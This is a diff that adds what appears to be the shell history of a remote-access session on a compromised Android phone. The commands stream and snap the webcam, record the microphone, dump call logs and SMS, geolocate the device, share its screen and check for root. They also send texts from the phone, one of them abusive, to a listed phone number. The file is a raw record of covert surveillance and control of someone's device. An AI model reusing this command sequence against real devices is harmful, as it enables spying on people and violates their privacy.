@@ -1,0 +1,35 @@
+webcam_list
+webcam_stream 2
+webcam_list
+webcam_stream 2
+webcam_list
+webcam_stream 1
+help
+app_list
+help
+send_sms
+send_sms -d +50431657691 -t "hello motherfucker"
+dump_calllog
+exit
+dump_calllog
+help
+exploit
+help
+wlan_geolocate
+wlan_geolocate -a
+geolocate
+webcam_list
+webcam_stream 2
+close
+help
+record_mic 25
+clear
+help
+screenshare
+dump_sms
+help
+send_sms
+send_sms -d +50431657691 -t HELLO WORLD
+check_root
+clear
+webcam_snap
